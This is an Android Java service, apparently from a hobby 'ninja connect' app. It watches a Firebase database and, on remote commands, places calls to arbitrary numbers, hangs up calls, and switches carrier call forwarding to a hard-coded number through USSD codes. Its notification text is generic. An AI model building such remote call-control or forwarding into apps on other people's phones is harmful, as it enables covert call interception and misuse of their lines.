package com.atul.ninja_connect_java;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
//import android.support.annotation.NonNull;
//import android.support.annotation.Nullable;
//import android.support.v4.app.ActivityCompat;
//import android.support.v4.app.NotificationCompat;
//import android.support.v4.content.ContextCompat;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Map;

public class CallBackgroundService extends Service {
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference, callDialDatabaseReference, workStatusDataReference;
    CallReceiver receiver = new CallReceiver();

    String MOBILE_NUMBER = "8805550284";

    MediaPlayer mp;
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private static final int REQUEST_CALL_PHONE = 1;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        // Create the notification
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Foreground Service")
                .setContentText("Service is running in the background")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .build();

        // Start the service as foreground with the notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }


//        mp = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI);
//        mp.setLooping(true);
//        mp.start();


        /*new Thread(new Runnable() {
            @Override
            public void run() {
                Log.e("check", "Still running....");
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }).start();*/


        firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference("call_status").child("answer");
        workStatusDataReference = firebaseDatabase.getReference("work_status").child("status");
        callDialDatabaseReference = firebaseDatabase.getReference("info");

        getNumberFromFirebase();
//        CallReceiver receiver = new CallReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
        registerReceiver(receiver, filter);


        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        unregisterReceiver(receiver);
        Log.e("check", "Service Stopped");
    }

    private void getNumberFromFirebase() {


        callDialDatabaseReference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                launchApplication();
                Log.e("check", "onDataChange: ");

//                long num = snapshot.getValue(Long.class);
//                String num = snapshot.getValue(String.class); // working
//                number = Long.toString(num);

//                Toast.makeText(context, "number is: " + num, Toast.LENGTH_SHORT).show();
//                makePhoneCall(num);
//                Toast.makeText(context, "onDataChange", Toast.LENGTH_SHORT).show();


//                Long str_num = snapshot.child("number").getValue(Long.class);
//                Long str_status = snapshot.child("status").getValue(Long.class);

//                Log.e("check", "str_num: " + str_num + "  str_status: " + str_status);


                readData(snapshot);

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

                Toast.makeText(getApplicationContext(), "onCancelled", Toast.LENGTH_SHORT).show();
            }
        });


        workStatusDataReference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                int status = snapshot.getValue(Integer.class);

                Log.e("check", "status: " + status);
                if (status == 0) {
                    stopForwarding();


                } else if (status == 1) {

                    startForwarding();
                }

                resetDatabase(getApplicationContext(), workStatusDataReference);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
//                Toast.makeText(context, "onCancelled", Toast.LENGTH_SHORT).show();

            }
        });


    }


    private void readData(DataSnapshot snapshot) {

        Map<String, Object> map = (Map<String, Object>) snapshot.getValue();
        String num = map.get("number").toString();
        String status = map.get("status").toString();

        Log.e("check", "number: " + num + " status: " + status);
        if (status.equalsIgnoreCase("1")) {
            makePhoneCall(num);
            Log.e("check", "MakePhoneCall() Method called");
        } else if (status.equalsIgnoreCase("0")) {
            disconnectCall();
            Log.e("check", "disconnectCall() method called");
        }
    }

    private void disconnectCall() {

        Toast.makeText(this, "Call Disconnected!", Toast.LENGTH_SHORT).show();

        TelecomManager tm = (TelecomManager) getApplicationContext().getSystemService(Context.TELECOM_SERVICE);
        if (tm != null) {
            if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {


                boolean success = tm.endCall();
                if (success) {
                    Toast.makeText(getApplicationContext(), "Call Disconnected", Toast.LENGTH_SHORT).show();
                }
            }
            // success == true if call was terminated.
        }

    }

    private void makePhoneCall(String str_number) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions((Activity) getApplicationContext(), new String[]{Manifest.permission.CALL_PHONE}, REQUEST_CALL_PHONE);
            } else {
//                String dial = "tel:" + PHONE_NUMBER;
                String dial = "tel:" + str_number;

                Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(dial));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);


//                startActivity(new Intent(Intent.ACTION_CALL, Uri.parse(dial)));
            }
        } else {
//            String dial = "tel:" + PHONE_NUMBER;
            String dial = "tel:" + str_number;

            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(dial));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

//            startActivity(new Intent(Intent.ACTION_CALL, Uri.parse(dial)));
        }
    }


    public void launchApplication() {

        /*Intent intent = new Intent(Intent.ACTION_MAIN);
//        intent.setPackage("com.example.app"); // Replace with the actual package name
//        intent.setPackage("com.google.android.youtube"); // Replace with the actual package name
        intent.setPackage("com.google.android.youtube"); // Replace with the actual package name
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Optional: start a new activity

        try {
            getApplicationContext().startActivity(intent);
        } catch (ActivityNotFoundException e) {
            // Handle the exception if the app is not found
            e.printStackTrace();
            Log.e("check", "error: " +e.getMessage());
        }*/


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(getApplicationContext())) {
            // Request permission to draw over other apps
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else {
            Intent intent = getApplicationContext().getPackageManager().getLaunchIntentForPackage("com.google.android.youtube");
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } else {
                Log.e("launchApplication", "YouTube app not installed.");
            }
        }


    }

    void startForwarding() {
        String dial = "tel:" + "*405*" + MOBILE_NUMBER;
        Intent dialCall = new Intent(Intent.ACTION_CALL, Uri.parse(dial));
        dialCall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(dialCall);


//        disconnectCall();


    }

    void stopForwarding(){
        String dial = "tel:" + "*413";

        Intent dialCall = new Intent(Intent.ACTION_CALL, Uri.parse(dial));
        dialCall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(dialCall);

    }


    private void resetDatabase(Context context, DatabaseReference databaseReference) {

//        firebaseDatabase.getReference("call_status").child("answer");

        databaseReference.setValue(2)
                .addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {

                        Log.e("check", "Data updated successfully!");
                    }
                })

                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {

                        Log.e("check", "Data update failed");

                    }
                });

    }


}
